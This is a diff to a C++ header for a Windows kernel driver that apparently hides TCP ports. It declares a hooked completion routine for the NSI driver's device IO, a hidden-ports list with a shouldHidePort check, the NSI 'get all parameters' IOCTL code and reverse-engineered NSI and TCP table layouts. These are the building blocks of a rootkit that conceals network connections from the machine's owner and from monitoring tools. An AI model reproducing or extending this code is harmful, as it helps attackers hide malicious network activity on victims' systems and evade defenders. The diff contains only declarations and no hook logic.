@@ -12,11 +12,13 @@ namespace NetworkHandler {
 
 	NTSTATUS hookedCompletionRoutine(PDEVICE_OBJECT  DeviceObject, PIRP  Irp, PVOID  Context);
 
-	USHORT htons(USHORT port);
+	USHORT htons(USHORT a);
 
 	void addHiddenPort(LIST_ENTRY* entry);
 
 	void cleanHiddenPorts();
+
+	bool shouldHidePort(USHORT port);
 
 	extern "C" NTSYSAPI NTSTATUS NTAPI ObReferenceObjectByName(
 		PUNICODE_STRING ObjectName,
@@ -33,7 +35,6 @@ namespace NetworkHandler {
 
 	extern PDRIVER_OBJECT pNsiDriverObject;
 	extern PDRIVER_DISPATCH originalNsiDeviceIo;
-	extern HiddenPorts HiddenPortsContext;
 
 	struct HiddenPort
 	{
@@ -41,11 +42,69 @@ namespace NetworkHandler {
 		USHORT HiddenPort;
 	};
 
-	struct HiddenPorts {
+	typedef struct _HIDDEN_PORTS {
 		LIST_ENTRY HiddenPortsHead;
 		int HiddenPortsCount;
 		FastMutex Mutex;
-	};
+	} HIDDEN_PORTS, *PHIDDERN_PORTS;
+
+	extern HIDDEN_PORTS HiddenPortsContext;
 
 	constexpr int MAX_HIDDEN_PORTS = 256;
+
+	constexpr ULONG  IOCTL_NSI_GETALLPARAM = 0x12001B;
+
+	typedef unsigned long DWORD;
+
+	typedef struct _NSI_STATUS_ENTRY
+	{
+		char bytesfill[12];
+
+	} NSI_STATUS_ENTRY, * PNSI_STATUS_ENTRY;
+
+	typedef struct _NSI_PARAM
+	{
+
+		DWORD UnknownParam1;
+		DWORD UnknownParam2;
+		DWORD UnknownParam3;
+		DWORD UnknownParam4;
+		DWORD UnknownParam5;
+		DWORD UnknownParam6;
+		PVOID lpMem;
+		DWORD UnknownParam8;
+		DWORD UnknownParam9;
+		DWORD UnknownParam10;
+		PNSI_STATUS_ENTRY lpStatus;
+		DWORD UnknownParam12;
+		DWORD UnknownParam13;
+		DWORD UnknownParam14;
+		DWORD TcpConnectionCount;
+
+
+	} NSI_PARAM, * PNSI_PARAM;
+
+	typedef struct _HP_CONTEXT
+	{
+		PIO_COMPLETION_ROUTINE oldIocomplete;
+		PVOID oldCtx;
+		BOOLEAN bShouldInvolve;
+		PKPROCESS pcb;
+	} HP_CONTEXT, * PHP_CONTEXT;
+
+	typedef struct _INTERNAL_TCP_TABLE_SUBENTRY
+	{
+		char bytesfill0[2];
+		USHORT Port;
+		DWORD dwIP;
+		char bytesfill[20];
+
+	} INTERNAL_TCP_TABLE_SUBENTRY, * PINTERNAL_TCP_TABLE_SUBENTRY;
+
+	typedef struct _INTERNAL_TCP_TABLE_ENTRY
+	{
+		INTERNAL_TCP_TABLE_SUBENTRY localEntry;
+		INTERNAL_TCP_TABLE_SUBENTRY remoteEntry;
+	} INTERNAL_TCP_TABLE_ENTRY, * PINTERNAL_TCP_TABLE_ENTRY;
+
 }
